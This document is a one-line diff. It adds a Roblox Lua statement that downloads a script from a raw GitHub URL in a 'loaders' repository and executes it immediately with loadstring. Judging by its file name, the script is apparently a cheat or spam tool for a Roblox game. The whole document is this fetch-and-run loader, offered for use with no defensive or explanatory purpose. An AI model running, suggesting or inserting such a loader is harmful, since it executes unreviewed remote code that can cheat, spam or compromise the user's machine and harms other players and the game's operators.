@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/GrandeurMare/loaders/main/loaders/morph-world-mimicer-spam4-m36h01k9l173ko.lua"))()
